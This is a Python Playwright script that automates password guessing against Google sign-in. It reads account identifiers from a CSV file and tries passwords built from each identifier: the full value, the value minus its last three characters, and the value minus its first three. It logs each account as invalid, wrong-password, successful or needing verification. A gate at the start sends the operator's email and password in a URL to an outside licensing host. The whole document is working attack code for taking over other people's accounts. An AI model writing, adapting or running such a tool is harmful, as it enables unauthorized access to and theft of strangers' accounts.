import asyncio
from time import sleep
from playwright.async_api import async_playwright
import csv
import requests
import os.path


async def save_output(file_name,data):
    check_file = os.path.exists(file_name)
    if check_file == True:
        file = open(file_name,"a")
        file.write(data)
    else:
        file = open(file_name,"w+")
        file.write(data)



async def run(playwright):

    email = input("Give Email address: ")
    passw = input("Give Password: ")

    url = 'https://tanvirblaster.xyz/api/check?email='+email+'&password='+passw
    respon = requests.request("GET",url)
    sleep(2)

    if (respon.text == '{"status":"success","message":"User Login Successful"}'):
        emails_arr = []
        
        with open('email_credentail.csv') as file:
            reader = csv.reader(file)
            for row in reader:
                if(row[0] != 'Email'):
                    emails_arr.append(row[0])
        
        for i in emails_arr:
            try:
                email = str(i)
                if email.startswith('0') == False :
                    email = '0' + email
                            
                chromium = playwright.firefox
                browser = await chromium.launch(
                    headless=True)
                page = await browser.new_page()
                await page.goto("https://accounts.google.com/signin")
                sleep(1)

                await page.wait_for_selector('input[type="email"]')
                await page.type('input[type="email"]', email)
                await page.click('button[jsname="LgbsSe"]')
                sleep(2)

                checked_email =await page.is_visible('div.o6cuMc')
                if checked_email == True:
                    await save_output('invalid_email.txt',email+',')
                    print('Invalid Email')
                    await browser.close()
                    continue
                
                m = 0
                password = email
                while(1):
                    await page.wait_for_selector('input[type="password"]')
                    print('Trying the password:  ',password)
                    await page.type('input[type="password"]', password)
                    await page.click('button[jsname="LgbsSe"]')

                    sleep(3)

                    checked_pass =await page.is_visible('div[jsname="B34EJ"]')
                    if checked_pass == True:
                        if(m==0):   
                            password = email[:-3] 
                        elif(m==1):
                            password = email[3:]
                        else:
                            await save_output('wrong_pass.txt',email+',')
                            print('Wrong Password')
                            break
                        m = m+1
                    else:
                        break
                
                if(m==2):
                    await browser.close()
                    continue

                sleep(4)

                checked_succesfull =await page.is_visible('h1[class="x7WrMb"]')
                if checked_succesfull == True:
                    await save_output('successful.txt',email+',')
                    print('Successful')
                    await browser.close()
                    continue
                
                print('Verification Required')
                await save_output('Varification.txt',email+',')
                await browser.close()
            except:
                pass
    else:
        print('Ivalid Email or Password!!!!!!!!!')


async def main():
    async with async_playwright() as playwright:
        await run(playwright)
        
asyncio.run(main())